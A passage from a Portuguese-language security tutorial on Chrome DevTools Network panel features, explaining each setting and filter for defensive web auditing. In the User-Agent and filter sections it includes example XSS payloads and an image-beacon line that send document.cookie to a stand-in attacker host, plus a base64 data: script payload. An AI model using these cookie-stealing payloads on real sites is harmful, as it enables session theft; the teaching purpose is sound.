- **Como corrigir ou prevenir**: implementar controle de concorrência no servidor (transações com isolamento adequado, `SELECT ... FOR UPDATE`, *locks* atômicos e chaves de idempotência) (**[REQUISITO]**) e aplicar *debounce* / bloqueio de estado (`disabled`) nos botões do front-end (**[BOA PRÁTICA]**).

##### More network conditions (User-Agent, Content encoding, Accepted encodings)

- **Nome do parâmetro**: **More network conditions** (Mais condições de rede — ícone de antena/rede com engrenagem na barra superior da aba Network, que abre a gaveta **Network conditions**).
- **O que significa**: painel complementar que permite sobrescrever parâmetros de negociação HTTP enviados pelo navegador, especificamente o cabeçalho **`User-Agent`** (e os cabeçalhos **User-Agent Client Hints** `Sec-CH-UA*`), bem como os algoritmos de compressão aceitos no cabeçalho **`Accept-Encoding`** (`gzip`, `deflate`, `br`, `zstd`).
- **Para que serve**:
  - Testar como o servidor responde a diferentes navegadores, sistemas operacionais, dispositivos móveis (Android, iPhone) ou robôs de busca (*Googlebot*, *Bingbot*).
  - Testar o comportamento do servidor quando o cliente não suporta compressão (`Accept-Encoding` desativado) ou suporta apenas um formato específico.
- **Onde encontrar no DevTools**: painel **Network** → barra superior → ícone **More network conditions** (ou pressione `Ctrl + Shift + P` → digite `Show Network conditions`).
- **Exemplo prático**:
  No painel **Network conditions**:
  1. Desmarque **Use browser default** na seção **User agent**.
  2. Selecione no menu `Googlebot` ou digite manualmente `MeuScannerDeSeguranca/1.0`.
  3. Recarregue a página e observe na aba **Headers** → **Request Headers** que o navegador enviou:
     ```http
     User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
     ```
  4. Na seção **Accepted Content-Encodings**, desmarque `gzip`, `deflate`, `br` e `zstd` para forçar o servidor a responder em texto puro sem compressão.
- **Comportamento normal**: por padrão, todas as opções usam o comportamento padrão do navegador (*Use browser default*). Qualquer alteração vale apenas para a aba atual enquanto o DevTools estiver aberto.
- **O que seria considerado seguro**: o servidor utilizar o `User-Agent` apenas para fins estatísticos ou de adaptação cosmética não crítica, **nunca** utilizando o `User-Agent` como controle de autenticação, autorização ou liberação de conteúdo pago/restrito.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Bypass de Controle de Acesso / Paywall via Spoofing de User-Agent**: o servidor entrega documentos confidenciais ou páginas restritas sem exigir login apenas porque o cabeçalho `User-Agent` foi trocado para `Googlebot` (prática insegura usada em tentativas malfeitas de SEO / *cloaking*).
  2. **Injeção via `User-Agent` (XSS Armazenado ou SQL Injection em Logs)**: se um painel administrativo exibe os logs de acesso dos visitantes sem sanitizar o `User-Agent`, um atacante pode definir o `User-Agent` no DevTools como `<script>fetch('https://atacante.test/?c='+document.cookie)</script>` e comprometer o administrador quando este visualizar a tela de logs.
- **Como investigar o problema**: altere o **User-Agent** em **Network conditions** para diferentes perfis (dispositivo móvel, *crawler*, string personalizada com caracteres especiais) e compare o código-fonte e o tamanho das respostas retornadas pelo servidor.
- **Como corrigir ou prevenir**: tratar o cabeçalho `User-Agent` (e qualquer outro cabeçalho HTTP enviado pelo cliente) como **entrada não confiável do usuário**, escapando-o antes de gravar em bancos de dados ou renderizar em painéis de monitoramento, e nunca basear decisões de autorização nele **[REQUISITO]**.

##### Import HAR file e Export HAR

- **Nome do parâmetro**: **Import HAR file** (ícone de seta para cima `⬆️`) e **Export HAR** / **Save all as HAR** (ícone de download `⬇️` na barra superior da aba Network).
- **O que significa**: **HAR (HTTP Archive)** é um formato padronizado baseado em **JSON** (extensão `.har`) que armazena a gravação completa de todas as requisições e respostas capturadas na aba Network, incluindo URLs, métodos, códigos de status, cabeçalhos completos, tempos detalhados de cada fase de rede e o corpo das mensagens.
- **Para que serve**:
  - Salvar a evidência técnica de um bug ou de uma vulnerabilidade de segurança para anexar a um relatório de auditoria (*pentest report* ou *bug bounty*).
  - Compartilhar uma sessão de rede problemática com outro engenheiro, que pode clicar em **Import HAR file** (`⬆️`) (ou simplesmente arrastar o arquivo `.har` para dentro da aba Network) para reconstruir exatamente a mesma tabela e inspecionar cada requisição.
- **Onde encontrar no DevTools**: painel **Network** → barra superior → ícones de seta para cima (**Import HAR file...**) e seta para baixo (**Export HAR...**), ou clicando com o botão direito em qualquer linha da tabela → **Save all as HAR** **[Varia por versão]**.
- **Exemplo prático**:
  Estrutura simplificada de um trecho dentro de um arquivo `sessao_loja.har`:
  ```json
  {
    "log": {
      "version": "1.2",
      "creator": { "name": "WebInspector", "version": "537.36" },
      "entries": [
        {
          "startedDateTime": "2026-10-30T10:15:00.120Z",
          "time": 84.5,
          "request": {
            "method": "POST",
            "url": "https://api.loja-ficticia.test/v1/login",
            "httpVersion": "h2",
            "headers": [
              { "name": "content-type", "value": "application/json" }
            ]
          },
          "response": {
            "status": 200,
            "statusText": "",
            "headers": [
              { "name": "set-cookie", "value": "sid=eyJhbGci...; HttpOnly; Secure" }
            ]
          }
        }
      ]
    }
  }
  ```

> [!CAUTION]
> **Arquivos HAR podem conter toda a sua sessão autenticada e senhas em texto claro!** Se você gravar um login e exportar um arquivo `.har` completo (com dados sensíveis) para enviar a um fórum público ou chamado de suporte externo, qualquer pessoa que abrir o arquivo terá acesso ao seu `Request Payload` (sua senha), aos cabeçalhos `Cookie`, `Set-Cookie` e `Authorization: Bearer ...`, podendo sequestrar sua conta imediatamente (**Session Hijacking**).

- **Comportamento normal** (**Distinção entre HAR sanitizado e HAR com dados sensíveis** **[Varia por versão]**):
  A partir de versões recentes do Chrome (Chrome 130+), para evitar vazamentos acidentais de credenciais quando usuários enviam arquivos HAR para suporte técnico, o botão **Export HAR** exporta por padrão um **HAR sanitizado** (*Export HAR (sanitized)...*), que **remove automaticamente** cabeçalhos sensíveis como `Cookie`, `Set-Cookie` e `Authorization`. Caso o analista de segurança precise exportar o arquivo completo (incluindo cookies e tokens), deve ativar primeiro a opção **`Settings (F1) → Preferences → Network → Allow to generate HAR with sensitive data`** e manter pressionado o botão de exportação (ou usar o menu de contexto) para escolher **`Export HAR (with sensitive data)...`**.
- **O que seria considerado seguro**:
  1. Ao compartilhar arquivos `.har` com terceiros, utilizar sempre a opção **sanitizada** (*sanitized*) e ainda assim revisar o arquivo em um editor de texto para confirmar que não há senhas no corpo das requisições (`postData`) nem tokens na resposta JSON (**[REQUISITO]**).
  2. Armazenar arquivos `.har` de auditorias em repositórios criptografados e com controle de acesso restrito (**[RECOMENDAÇÃO]**).
- **O que poderia indicar uma vulnerabilidade**: receber ou encontrar arquivos `.har` públicos anexados em *issues* do GitHub, Jira ou sistemas de chamados contendo cabeçalhos `Authorization`, `Cookie` ou chaves de API ativas.
- **Como investigar o problema**: abra o arquivo `.har` em um editor de texto ou importe-o no DevTools (**Import HAR file**) e utilize a busca (`Ctrl + F`) por `"Cookie"`, `"Set-Cookie"`, `"Authorization"`, `"password"` e `"token"`.
- **Como corrigir ou prevenir**: revogar imediatamente na aplicação qualquer sessão ou token presente em um arquivo `.har` exposto indevidamente e utilizar a exportação sanitizada por padrão **[REQUISITO]**.

##### Request blocking (Bloqueio de requisições)

- **Nome do parâmetro**: **Request blocking** / **Network request blocking** (Bloqueio de requisições de rede).
- **O que significa**: funcionalidade que permite criar regras baseadas em padrões de URL (com curingas `*`) ou domínios para impedir que o navegador envie determinadas requisições de rede, simulando uma falha imediata de carregamento (`(blocked:devtools)`).
- **Para que serve**:
  - Testar a resiliência da aplicação (*graceful degradation*) quando uma CDN externa, um script de *analytics*, um serviço de *captcha* ou uma folha de estilo falha ao carregar.
  - Em auditorias de segurança: bloquear scripts de telemetria, scripts de redirecionamento forçado ou *heartbeats* barulhentos que atrapalham a análise de uma página.
- **Onde encontrar no DevTools**:
  1. Clique com o botão direito sobre qualquer requisição na tabela do painel **Network** e selecione **Block request URL** (bloquear aquela URL exata) ou **Block request domain** (bloquear todo o domínio).
  2. Ou abra a gaveta inferior (**Drawer** com `Esc` ou `Ctrl + Shift + P` → `Show Network request blocking`) para adicionar padrões manualmente (ex.: `*://*.tracker-exemplo.test/*`).
- **Exemplo prático**: uma página maliciosa ou mal programada possui um script externo `https://cdn.loja-ficticia.test/anti-debug.js` que redireciona o usuário para fora da página sempre que detecta um erro. O analista clica com o botão direito sobre `anti-debug.js` na aba Network, escolhe **Block request URL** e recarrega a página. Na tabela do Network, a requisição aparece em vermelho com `Status: (blocked:devtools)`, e o script não é executado.
- **Comportamento normal**: permanece ativo apenas enquanto o DevTools estiver aberto e a caixa `Enable network request blocking` estiver marcada na gaveta inferior.
- **O que seria considerado seguro**: a aplicação nunca depender da execução de um script externo no cliente para impor restrições de segurança (como bloquear um usuário banido ou validar permissões apenas via JavaScript), pois qualquer usuário pode bloquear esse script usando **Request blocking** **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**: se, ao bloquear uma requisição JavaScript específica (como `validacao-assinatura-premium.js` ou `paywall.js`), o conteúdo restrito ou funcionalidades administrativas passarem a funcionar livremente na página, isso comprova que o controle de acesso foi implementado de forma insegura exclusivamente no lado do cliente (**Client-Side Enforcement of Server-Side Security** — CWE-602).
- **Como investigar o problema**: identifique scripts que parecem realizar verificações de permissão ou licença no cliente, aplique **Block request URL** neles, recarregue a página e verifique se o servidor ainda protege os endpoints da API ou se entrega os dados sem restrição.
- **Como corrigir ou prevenir**: validar autenticação, autorização, licenciamento e regras de negócio críticas obrigatoriamente no **back-end (servidor)** em cada requisição à API **[REQUISITO]**.

##### Local overrides (Sobrescritas locais)

- **Nome do parâmetro**: **Local overrides** (Sobrescritas locais de conteúdo e cabeçalhos de resposta).
- **O que significa**: recurso do Chrome DevTools que permite interceptar a resposta de qualquer requisição web (um arquivo HTML, CSS, JavaScript, um payload JSON de API ou os **Response Headers**) e substituí-la por uma versão editada salva em uma pasta local do computador do usuário. Diferentemente de edições comuns no painel *Elements* (que se perdem ao recarregar a página), os **Local overrides** **persistem entre recarregamentos (`F5`)**.
- **Para que serve**:
  - Prototipar e testar correções em produção (como testar se a adição de um cabeçalho `Content-Security-Policy` ou `Access-Control-Allow-Origin` corrige um problema) sem precisar ter acesso imediato ao servidor de hospedagem.
  - Em testes de segurança autorizados: modificar a resposta JSON de uma API (por exemplo, alterar `"isAdmin": false` para `"isAdmin": true` na resposta de `GET /api/perfil`) para verificar se a interface desbloqueia telas ocultas e se o back-end realmente bloqueia as chamadas subsequentes.
- **Onde encontrar no DevTools**:
  - Na aba **Network**: clique com o botão direito sobre uma requisição → **Override content** (sobrescrever o corpo da resposta) ou **Override headers** (sobrescrever os cabeçalhos de resposta).
  - Para gerenciar todas as sobrescritas: painel **Sources** → sub-aba lateral **Overrides** → `Select folder for overrides` (o Chrome pedirá permissão na barra superior para acessar uma pasta local).
- **Exemplo prático**:
  Você está auditando `https://loja-ficticia.test` e nota que a página não envia o cabeçalho `Content-Security-Policy`. Antes de pedir para a equipe de infraestrutura alterar o servidor Nginx, você:
  1. Clica na requisição principal `loja-ficticia.test` na aba **Network**.
  2. Na aba **Headers** → **Response Headers**, clica em **Add header** (via *Override headers*).
  3. Adiciona `Content-Security-Policy: default-src 'self'; script-src 'self'` e recarrega a página.
  4. O navegador passa a aplicar a CSP imediatamente como se tivesse vindo do servidor, permitindo ver na aba **Console** se algum script legítimo da página quebrou! As requisições com sobrescrita ativa exibem um **ponto roxo** ao lado do ícone ou do código de status.
- **Comportamento normal**: quando ativo, exibe um ícone/ponto roxo na aba **Network** e na aba **Sources** indicando que o conteúdo ou cabeçalho exibido veio do disco local (*Local Override*) e não da resposta real do servidor.
- **O que seria considerado seguro**: se um usuário mal-intencionado usar **Local overrides** para alterar a resposta de `GET /api/usuario/42` de `{"role": "cliente"}` para `{"role": "admin"}`, o front-end até poderá desenhar o botão "Excluir Banco de Dados" na tela, mas quando o usuário clicar nesse botão e o navegador enviar `DELETE /api/admin/database`, o **servidor deverá retornar `403 Forbidden`**, pois o estado real de permissão é verificado no servidor e nunca confiado ao que o cliente pensa que recebeu **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**: quando a alteração de um booleano (`"autorizado": true`, `"pago": true`) na resposta JSON via **Override content** faz o fluxo do cliente avançar e concluir uma operação privilegiada no servidor sem que o back-end revalide a permissão.
- **Como investigar o problema**: clique com o botão direito na resposta JSON de autenticação/perfil na aba Network → **Override content**, altere flags de permissão/plano para valores superiores, recarregue a página (`Ctrl + R`) e tente acionar as rotas administrativas descobertas na interface, observando na aba Network se a API responde `200 OK` (vulnerável!) ou `403 Forbidden` (seguro).
- **Como corrigir ou prevenir**: jamais confiar no estado da interface gráfica para autorizar operações; toda rota de API deve validar a sessão/token e as permissões do usuário diretamente no servidor **[REQUISITO]**.

##### Network settings (Big request rows, Group by frame, Show overview, Capture screenshots)

- **Nome do parâmetro**: **Network settings** (Configurações de visualização da aba Network — ícone de engrenagem `⚙` localizado no canto direito da **barra de controles da aba Network**, abaixo da engrenagem global do DevTools).
- **O que significa**: conjunto de quatro caixas de seleção que controlam a densidade de informação e o agrupamento visual do painel Network:
  1. **Use large request rows** (*Big request rows* — Linhas grandes de requisição).
  2. **Group by frame** (Agrupar por quadro/`<iframe>`).
  3. **Show overview** (Mostrar gráfico temporal superior).
  4. **Capture screenshots** (Capturar quadros visuais da página durante o carregamento).
- **Para que serve**:
  - **Use large request rows**: duplica a altura de cada linha da tabela para exibir **dois valores por célula** nas colunas principais (por exemplo, na coluna `Name` mostra o nome curto em cima e o caminho/domínio embaixo; na coluna `Size` mostra o **Transfer Size** em cima e o **Resource Size** descompactado embaixo; na coluna `Time` mostra o **Tempo Total** em cima e a **Latência/TTFB** embaixo).
  - **Group by frame**: organiza as requisições em pastas expansíveis separando o que foi disparado pelo documento principal (`top`) do que foi disparado por cada `<iframe>` embutido (como *widgets* de pagamento, vídeos ou anúncios).
  - **Show overview**: exibe ou oculta a linha do tempo horizontal no topo do painel.
  - **Capture screenshots**: tira fotos sequenciais da tela durante o carregamento para correlacionar visualmente em que milissegundo a tela deixou de ficar em branco.
- **Onde encontrar no DevTools**: painel **Network** → canto superior direito da barra de controles da aba Network → ícone de engrenagem secundária (`⚙`).
- **Exemplo prático**:
  Com **Use large request rows** ativado, a coluna `Size` da requisição `bundle.js` exibe:
  ```text
  45.2 kB   <- Bytes efetivamente transferidos pela rede (comprimido com Brotli)
  198 kB    <- Tamanho real do código JavaScript descompactado na memória
  ```
- **Comportamento normal**: por padrão, apenas **Show overview** costuma vir marcado; **Use large request rows** e **Group by frame** são ativados conforme a necessidade do analista.
- **O que seria considerado seguro**: em páginas de checkout que utilizam `<iframe>` isolado de um provedor de pagamento (padrão **PCI-DSS — Payment Card Industry Data Security Standard**), ao ativar **Group by frame**, as requisições com dados do cartão de crédito devem aparecer exclusivamente dentro do grupo do `<iframe>` seguro do gateway de pagamento, e nunca no quadro principal da loja.
- **O que poderia indicar uma vulnerabilidade**:
  1. Ao ativar **Group by frame**, descobrir um `<iframe>` oculto carregando scripts e disparando requisições para domínios suspeitos.
  2. Ao ativar **Use large request rows**, notar que uma resposta de erro de login (`401 Unauthorized`) para um e-mail existente tem `Resource Size` de `450 B`, enquanto para um e-mail inexistente tem `310 B`, permitindo **Enumeração de Usuários** baseada na diferença de tamanho mesmo que a interface exiba a mesma mensagem genérica.
- **Como investigar o problema**: ative **Use large request rows** e **Group by frame** durante auditorias para visualizar simultaneamente o caminho completo, o tamanho real descompactado e o contexto de execução (`frame`) de cada requisição.
- **Como corrigir ou prevenir**: isolar componentes de terceiros em `<iframe sandbox="...">` (**[RECOMENDAÇÃO]**) e padronizar as respostas de endpoints de autenticação/recuperação de senha para que tenham exatamente a mesma estrutura, código de status e tempo de resposta independentemente de o usuário existir ou não (**[RECOMENDAÇÃO]**).

---

<a id="s2-1-3"></a>
#### 2.1.3 Filtros da aba Network

Em aplicações web modernas, um único carregamento de página pode disparar de 50 a mais de 300 requisições HTTP. A **Barra de Filtros** permite isolar cirurgicamente as transações relevantes por expressão textual, operadores de propriedades HTTP, tipo de recurso (**MIME type** / destino) ou alertas de segurança. A seguir, cada elemento da barra de filtros é detalhado nos 10 pontos obrigatórios.

##### Filter (caixa de busca e operadores de filtragem)

- **Nome do parâmetro**: **Filter** (Caixa de entrada de filtro — campo de texto com espaço reservado *Filter* na barra de filtros).
- **O que significa**: motor de filtragem em tempo real da tabela de requisições. Diferentemente do **Search (`Ctrl+F`)** (que busca *dentro* do corpo das respostas), a caixa **Filter** oculta ou exibe linhas da tabela com base na URL, expressão regular (`/.../`) ou em **operadores estruturados de propriedade** (como `domain:`, `status-code:`, `method:`, `has-response-header:`). Qualquer operador pode ser **negado** colocando um sinal de menos (`-`) imediatamente antes dele.
- **Para que serve**: isolar rapidamente requisições com base em critérios técnicos precisos — por exemplo, ver apenas requisições `POST`, apenas respostas com erro `4xx`/`5xx`, apenas chamadas para um subdomínio específico ou respostas que definiram um cookie específico.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros (segunda linha horizontal) → caixa de texto à esquerda.
- **Exemplo prático**:
  Tabela dos principais operadores da caixa **Filter** no Chrome DevTools:

| Operador no Filter | O que filtra | Exemplo Prático | Uso em Auditoria de Segurança |
|---|---|---|---|
| `domain:` | Domínio exato ou com curinga `*` | `domain:*.exemplo.test` ou `-domain:cdn.exemplo.test` | Isolar chamadas da API ou descobrir conexões para domínios externos desconhecidos |
| `status-code:` | Código de status HTTP | `status-code:403` ou `status-code:500` | Encontrar falhas de autorização (`401`/`403`) ou erros internos de servidor (`500`) |
| `method:` | Método HTTP da requisição | `method:POST` ou `method:DELETE` | Listar apenas operações que enviam dados ou modificam estado no servidor |
| `mime-type:` | Tipo MIME da resposta (`Content-Type`) | `mime-type:application/json` | Ver todas as respostas JSON mesmo que o tipo do recurso não seja `fetch` |
| `larger-than:` | Respostas maiores que `N` bytes (`k` para kB, `M` para MB) | `larger-than:100k` ou `larger-than:1M` | Detectar vazamentos massivos de registros (ex.: endpoint que baixou a tabela inteira de clientes) |
| `has-response-header:` | Presença de um cabeçalho na resposta | `has-response-header:Set-Cookie` ou `-has-response-header:Content-Security-Policy` | Descobrir quais respostas definem cookies ou quais páginas esqueceram de enviar um header de segurança |
| `has-request-header:` | Presença de um cabeçalho na requisição **[Varia por versão]** | `has-request-header:Authorization` | Identificar todas as chamadas que transmitiram um token Bearer |
| `set-cookie-name:` | Nome do cookie definido em `Set-Cookie` | `set-cookie-name:session_id` | Rastrear exatamente em qual requisição o cookie de sessão foi criado ou sobrescrito |
| `set-cookie-value:` | Valor do cookie definido em `Set-Cookie` | `set-cookie-value:true` | Localizar cookies com valores previsíveis |
| `set-cookie-domain:` | Atributo `Domain` do `Set-Cookie` | `set-cookie-domain:.loja-ficticia.test` | Verificar o escopo de compartilhamento de cookies entre subdomínios |
| `scheme:` | Esquema de protocolo (`http`, `https`, `ws`, `wss`) | `scheme:http` | Detectar imediatamente qualquer requisição não criptografada (*Mixed Content* ou HTTP puro) |
| `is:` | Estado especial da requisição (`running`, `from-cache`, `service-worker-intercepted`, `third-party`) | `is:running` ou `-is:from-cache` | Ver conexões ainda abertas (*long polling*, streams, WebSockets) ou ignorar itens vindos do cache |
| `/regex/` | Expressão regular sobre o nome/URL | `/\/api\/v[12]\/admin/` | Encontrar rotas administrativas ou padrões específicos de URL |

- **Comportamento normal**: múltiplos operadores podem ser combinados separando-os por espaço (funcionando como um `AND` lógico). Por exemplo: `scheme:https method:POST status-code:200` exibe apenas requisições `POST` feitas sobre `HTTPS` que retornaram `200`.
- **O que seria considerado seguro**:
  - Ao filtrar por `scheme:http`, a tabela deve ficar completamente vazia (`0 requests`).
  - Ao filtrar por `mime-type:text/html -has-response-header:Content-Security-Policy`, documentos HTML da aplicação não devem aparecer sem política de segurança.
- **O que poderia indicar uma vulnerabilidade**:
  - `scheme:http` retornando requisições ativas com dados ou scripts.
  - `status-code:500` revelando endpoints que quebraram com entradas inesperadas (possível indício de **SQL Injection** ou falha de tratamento de exceções).
  - `larger-than:500k mime-type:application/json` revelando uma rota de API que despeja milhares de registros sem paginação nem filtragem de campos (**Excessive Data Exposure**).
- **Como investigar o problema**: utilize combinações de operadores com negação (`-`) durante o checklist de segurança (veja a [Seção 6.1 Auditoria na Aba Network](./06-checklist-e-comparativo.md#s6)).
- **Como corrigir ou prevenir**: corrigir no servidor os endpoints identificados pelos filtros (forçar HTTPS via HSTS, adicionar headers de segurança ausentes, paginar e filtrar respostas de API e tratar erros `500` de forma genérica) **[REQUISITO]**.

##### Invert

- **Nome do parâmetro**: **Invert** (Inverter filtro).
- **O que significa**: caixa de seleção ao lado da caixa de texto **Filter** que aplica a negação lógica (`NOT`) a toda a expressão digitada na caixa de busca.
- **Para que serve**: exibir todas as requisições que **não** correspondem ao termo ou operador digitado na caixa de filtro, sem precisar adicionar o prefixo `-` manualmente a cada termo.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → checkbox **Invert** imediatamente à direita do campo de texto *Filter*.
- **Exemplo prático**:
  Você quer auditar quais respostas da aplicação `loja-ficticia.test` **não** possuem o cabeçalho `X-Content-Type-Options`:
  1. Digite `has-response-header:X-Content-Type-Options` na caixa **Filter**.
  2. Marque a caixa **Invert**.
  3. A tabela mostrará imediatamente apenas as respostas onde esse cabeçalho de segurança está ausente!
- **Comportamento normal**: permanece desmarcado por padrão; só produz efeito visual quando há algum texto ou operador preenchido na caixa **Filter**.
- **O que seria considerado seguro**: ao digitar `domain:*.loja-ficticia.test` e marcar **Invert**, restarem apenas domínios de terceiros estritamente conhecidos, documentados e autorizados pela arquitetura do sistema.
- **O que poderia indicar uma vulnerabilidade**: ao inverter o filtro do domínio oficial da empresa, descobrir requisições sendo disparadas para domínios desconhecidos, endereços IP brutos (ex.: `http://198.51.100.99/gate.php`) ou domínios com *typosquatting* (ex.: `cdn-jquery-analytics.test`).
- **Como investigar o problema**: filtre pelo domínio principal da aplicação, marque **Invert** e inspecione a coluna **Initiator** de cada requisição restante para identificar qual script introduziu a comunicação externa.
- **Como corrigir ou prevenir**: remover scripts de terceiros não homologados e restringir conexões externas por meio da diretiva `connect-src` da **CSP (Content Security Policy)** **[RECOMENDAÇÃO]**.

##### Hide data URLs

- **Nome do parâmetro**: **Hide data URLs** (Ocultar URLs de dados `data:`).
- **O que significa**: caixa de seleção que oculta da tabela de requisições os recursos embutidos diretamente no código HTML/CSS/JS por meio do esquema **`data:`** (definido na RFC 2397, como `data:image/svg+xml;base64,...` ou `data:application/octet-stream;base64,...`). Como esses dados já vieram dentro do documento ou script, eles não geram tráfego real na placa de rede, mas o Chrome os lista na aba Network como pseudo-requisições para fins de depuração.
- **Para que serve**: limpar a tabela de requisições quando a página utiliza dezenas de pequenos ícones SVG ou fontes codificadas em Base64 dentro do CSS, facilitando a visualização das chamadas HTTP reais.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → checkbox **Hide data URLs**.
- **Exemplo prático**: uma página moderna carrega 40 ícones como `data:image/png;base64,iVBORw0KGgoAAAANS...`. Ao marcar **Hide data URLs**, essas 40 linhas desaparecem da tabela, deixando visíveis apenas as requisições `http://` e `https://`.
- **Comportamento normal**: pode ser marcado durante a análise de tráfego HTTP de APIs, mas **deve ser desmarcado** ao investigar ataques de injeção no cliente (**XSS / Phishing**).
- **O que seria considerado seguro**: `data:` URLs utilizadas exclusivamente para ativos estáticos inofensivos (como imagens rasterizadas PNG/JPEG/WebP ou fontes tipográficas).
- **O que poderia indicar uma vulnerabilidade**:
  1. **XSS via `data:text/javascript` ou `data:text/html`**: um atacante injeta `<script src="data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script>` ou um `<iframe src="data:text/html;base64,...">` para executar código malicioso sem disparar requisição para um servidor externo! Se **Hide data URLs** estiver marcado, o analista não verá a carga do payload na aba Network.
  2. **SVG com JavaScript embutido**: arquivos `data:image/svg+xml` carregados em contextos navegáveis (`<iframe>`, `<object>`, `<embed>`) contendo tags `<script>` internas.
- **Como investigar o problema**: ao investigar suspeitas de **XSS** ou comportamento anômalo no DOM, **desmarque** **Hide data URLs**, digite `scheme:data` na caixa **Filter** e inspecione na aba **Response** o conteúdo decodificado de qualquer item `data:text/html`, `data:text/javascript` ou `data:image/svg+xml`.
- **Como corrigir ou prevenir**: nunca incluir o esquema `data:` na diretiva `script-src` nem em `object-src` da **Content Security Policy (CSP)**, pois `script-src 'self' data:` permite o contorno trivial da CSP **[REQUISITO]**.

##### Hide extension URLs

- **Nome do parâmetro**: **Hide extension URLs** (Ocultar URLs de extensões do navegador — esquema `chrome-extension://`).
- **O que significa**: caixa de seleção que oculta da tabela todas as requisições originadas ou direcionadas a extensões instaladas no navegador do próprio usuário (cujas URLs começam com `chrome-extension://<ID-da-extensao>/...` ou cujo iniciador é um *content script* de extensão).
- **Para que serve**: evitar que extensões pessoais do desenvolvedor ou auditor (como bloqueadores de anúncios, gerenciadores de senhas, tradutores ou carteiras de criptomoedas) poluam a análise com scripts e requisições que **não pertencem** à aplicação web auditada.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → checkbox **Hide extension URLs**.
- **Exemplo prático**: um estudante está auditando `https://loja-ficticia.test` e vê na tabela uma requisição `chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/inpage.js` e acha que é um bug do site. Ao marcar **Hide extension URLs**, a linha some, pois tratava-se apenas de uma extensão instalada no Chrome dele.
- **Comportamento normal**: mantém-se marcado durante auditorias de aplicações web para focar exclusivamente no tráfego próprio do site; alternativamente, audita-se a aplicação em uma janela anônima (*Incognito*) sem extensões ativas.
- **O que seria considerado seguro**: realizar testes de segurança e provas práticas em um perfil limpo do navegador ou com **Hide extension URLs** marcado para não confundir tráfego de extensão com tráfego da aplicação **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Extensão maliciosa instalada na máquina do próprio usuário**: ao **desmarcar** **Hide extension URLs**, notar que uma extensão instalada no navegador está lendo dados de formulários e disparando requisições `POST` para servidores externos.
  2. **Extension Fingerprinting (Impressão digital de extensões)**: o site avaliado tenta carregar dezenas de recursos `chrome-extension://.../manifest.json` para descobrir quais extensões o visitante possui instaladas.
- **Como investigar o problema**: se suspeitar que uma extensão do navegador está interferindo na página ou vazando dados, desmarque **Hide extension URLs** e filtre por `scheme:chrome-extension` ou observe a coluna **Initiator** procurando por scripts `chrome-extension://`.
- **Como corrigir ou prevenir**: executar auditorias de segurança em um perfil de navegador dedicado e sem extensões de terceiros instaladas **[BOA PRÁTICA]**.

##### All

- **Nome do parâmetro**: **All** (Todos os tipos de recurso).
- **O que significa**: botão (pílula) padrão na barra de filtros de categoria que desativa qualquer restrição por tipo de recurso, exibindo juntas todas as requisições HTTP, WebSockets, documentos, scripts, estilos, imagens e demais chamadas.
- **Para que serve**: fornecer a visão panorâmica e cronológica completa de tudo o que aconteceu na rede desde o início da gravação.
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → primeiro botão do grupo de tipos de recurso (**All**).
- **Exemplo prático**: após filtrar apenas por `JS` para analisar scripts, o analista clica em **All** para voltar a enxergar a sequência completa entre o documento HTML (`Doc`), os scripts (`JS`) e as chamadas de API (`Fetch/XHR`).
- **Comportamento normal**: quando **All** está selecionado, todos os outros botões de tipo (`Fetch/XHR`, `Doc`, `CSS`, etc.) ficam desmarcados. (Dica: é possível selecionar múltiplos tipos simultaneamente segurando a tecla `Ctrl` ou `Cmd` ao clicar, por exemplo, em `Doc` e `Fetch/XHR`).
- **O que seria considerado seguro**: usar a visão **All** no início e no fim de toda auditoria de segurança na aba Network para garantir que nenhum canal alternativo de exfiltração (como envio de dados via `Img`, `Font` ou `WS`) passou despercebido.
- **O que poderia indicar uma vulnerabilidade**: quando o analista olha apenas para `Fetch/XHR` e deixa de ver que um script malicioso na página está exfiltrando cookies concatenados na query string de uma imagem invisível (`new Image().src = "https://atacante.test/logo.png?cookie=" + document.cookie`), que só aparece sob `Img` ou **All**.
- **Como investigar o problema**: selecione **All**, ordene pela coluna **Domain** e revise todas as origens externas contactadas pela página, independentemente do tipo de recurso.
- **Como corrigir ou prevenir**: aplicar uma **Content Security Policy (CSP)** abrangente (com `default-src 'self'` e restrições específicas em `img-src`, `script-src`, `connect-src`, `font-src` e `style-src`) para impedir exfiltração por tipos de recursos alternativos **[RECOMENDAÇÃO]**.

##### Fetch/XHR

- **Nome do parâmetro**: **Fetch/XHR** (Requisições assíncronas via Fetch API e `XMLHttpRequest`).
- **O que significa**: filtro de categoria que exibe exclusivamente as requisições HTTP disparadas de forma programática e assíncrona pelo código JavaScript da página utilizando a moderna **Fetch API** (`fetch()`) ou a API clássica **XHR (`XMLHttpRequest`)** — base da arquitetura **AJAX (Asynchronous JavaScript and XML)** e das aplicações **SPA (Single-Page Applications)**.
- **Para que serve**: isolar a comunicação entre o front-end e as **APIs REST / GraphQL** do back-end (como login via JSON, busca de produtos, atualização de perfil, transferência bancária), ocultando arquivos estáticos de layout (imagens, fontes, CSS).
- **Onde encontrar no DevTools**: painel **Network** → barra de filtros → botão **Fetch/XHR**.
- **Exemplo prático**:
  Ao clicar em "Ver Meu Perfil" em uma aplicação React/Vue/Angular e selecionar o filtro **Fetch/XHR**, você vê limpa na tabela a chamada:
  ```text
  Name: 42   | Method: GET | Status: 200 | Type: fetch | URL: https://api.loja-ficticia.test/v1/usuarios/42
  ```
- **Comportamento normal**: concentra a maior parte da lógica de negócios e troca de dados dinâmicos (geralmente em formato `application/json`) de sistemas web modernos.
- **O que seria considerado seguro**:
  - Todas as chamadas **Fetch/XHR** trafegando sob `https://`.
  - Endpoints autenticados validando a sessão/token do usuário e aplicando controle de acesso por objeto e por função no servidor.
  - Respostas JSON contendo apenas os campos estritamente necessários para a tela atual.
- **O que poderia indicar uma vulnerabilidade**:
